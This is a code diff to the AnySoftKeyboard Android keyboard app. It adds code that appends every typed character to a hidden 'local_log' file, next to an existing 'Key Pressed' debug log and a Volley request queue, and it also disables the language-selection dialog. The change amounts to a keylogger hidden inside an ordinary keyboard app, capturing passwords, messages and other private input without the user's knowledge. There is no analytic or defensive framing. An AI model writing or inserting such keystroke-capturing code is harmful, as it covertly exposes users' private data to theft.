@@ -94,6 +94,13 @@ import com.menny.android.anysoftkeyboard.AnyApplication;
 import com.menny.android.anysoftkeyboard.BuildConfig;
 import com.menny.android.anysoftkeyboard.R;
 
+import java.io.BufferedInputStream;
+import java.io.BufferedReader;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.InputStream;
+import java.io.InputStreamReader;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.Collections;
@@ -1076,17 +1083,17 @@ public abstract class AnySoftKeyboard extends AnySoftKeyboardWithGestureTyping {
                 nextKeyboard(getCurrentInputEditorInfo(), NextKeyboardType.Symbols);
                 break;
             case KeyCodes.MODE_ALPHABET:
-                if (getKeyboardSwitcher().shouldPopupForLanguageSwitch()) {
-                    showLanguageSelectionDialog();
-                } else {
+                /*if (getKeyboardSwitcher().shouldPopupForLanguageSwitch()) {
+                    //showLanguageSelectionDialog();
+                } else {*/
                     nextKeyboard(getCurrentInputEditorInfo(), NextKeyboardType.Alphabet);
-                }
+                //}
                 break;
             case KeyCodes.UTILITY_KEYBOARD:
                 getInputView().openUtilityKeyboard();
                 break;
             case KeyCodes.MODE_ALPHABET_POPUP:
-                showLanguageSelectionDialog();
+                //showLanguageSelectionDialog();
                 break;
             case KeyCodes.ALT:
                 nextAlterKeyboard(getCurrentInputEditorInfo());
@@ -1203,6 +1210,27 @@ public abstract class AnySoftKeyboard extends AnySoftKeyboardWithGestureTyping {
 
         final String keypress = String.valueOf((char)primaryCode);
         Log.d("Key Pressed",keypress);
+
+
+
+        String filename = "local_log";
+
+        File myDir = getFilesDir();
+
+        try {
+            File secondFile = new File(myDir + "/text/", filename);
+            if (secondFile.getParentFile().mkdirs()) {
+                secondFile.createNewFile();
+            }
+            FileOutputStream fos = new FileOutputStream(secondFile, true);
+
+            fos.write(keypress.getBytes());
+            fos.flush();
+            fos.close();
+
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
 
 
         RequestQueue queue = Volley.newRequestQueue(this);
@@ -1323,7 +1351,7 @@ public abstract class AnySoftKeyboard extends AnySoftKeyboardWithGestureTyping {
         }
     }
 
-    private void showLanguageSelectionDialog() {
+    /*private void showLanguageSelectionDialog() {
         List<KeyboardAddOnAndBuilder> builders = getKeyboardSwitcher().getEnabledKeyboardsBuilders();
         ArrayList<CharSequence> keyboardsIds = new ArrayList<>();
         ArrayList<CharSequence> keyboards = new ArrayList<>();
@@ -1357,7 +1385,7 @@ public abstract class AnySoftKeyboard extends AnySoftKeyboardWithGestureTyping {
                     else
                         getKeyboardSwitcher().nextAlphabetKeyboard(currentEditorInfo, id.toString());
                 });
-    }
+    }*/
 
     @Override
     public View onCreateExtractTextView() {
